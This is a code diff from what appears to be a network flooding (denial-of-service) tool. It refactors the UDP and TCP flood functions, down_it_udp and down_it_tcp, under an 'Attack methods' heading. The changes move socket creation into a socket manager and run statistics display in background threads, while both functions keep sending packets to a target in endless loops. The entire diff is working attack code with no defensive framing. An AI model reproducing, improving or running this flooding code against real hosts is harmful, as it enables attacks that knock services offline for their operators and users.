@@ -9,8 +9,6 @@ from statistics import show_statistics
 from common import get_random_string, get_server_ip_error_msg
 import services
 
-_ctx = Context()
-
 
 ###############################################
 # Attack methods
@@ -24,18 +22,19 @@ def down_it_udp(_ctx: Context):
                  f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
                  f'\n{_ctx.base_headers[0]}' \
                  f'\n\n{extra_data}'.encode('utf-8')
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock = _ctx.sock_manager.get_udp_socket()
 
         try:
             sock.sendto(packet, (_ctx.host, _ctx.port))
         except socket.gaierror:
             if get_server_ip_error_msg not in _ctx.errors:
                 _ctx.errors.append(str(get_server_ip_error_msg))
+        except:
+            _ctx.sock_manager.close_udp_socket()
         else:
             if get_server_ip_error_msg in _ctx.errors:
                 _ctx.errors.remove(str(get_server_ip_error_msg))
             _ctx.packets_sent += 1
-        sock.close()
 
         if _ctx.port:
             i += 1
@@ -45,7 +44,11 @@ def down_it_udp(_ctx: Context):
                 thread.daemon = True
                 thread.start()
 
-        show_statistics(_ctx)
+        if not _ctx.show_statistics:
+            thread = threading.Thread(target=show_statistics, args=[_ctx])
+            thread.daemon = True
+            thread.start()
+
         time.sleep(.01)
 
 
@@ -76,9 +79,7 @@ def down_it_tcp(_ctx: Context):
     """TCP flood."""
     while True:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            sock.settimeout(5)
+            sock = _ctx.sock_manager.create_tcp_socket()
             sock.connect((_ctx.host, _ctx.port))
             _ctx.connections_success += 1
             while True:
@@ -92,9 +93,15 @@ def down_it_tcp(_ctx: Context):
                     break
                 else:
                     _ctx.packets_sent += bytes_to_send_len
-                    show_statistics(_ctx)
+                    if not _ctx.show_statistics:
+                        thread = threading.Thread(target=show_statistics, args=[_ctx])
+                        thread.daemon = True
+                        thread.start()
         except:
             _ctx.connections_failed += 1
-            show_statistics(_ctx)
+            if not _ctx.show_statistics:
+                thread = threading.Thread(target=show_statistics, args=[_ctx])
+                thread.daemon = True
+                thread.start()
 
         time.sleep(.01)
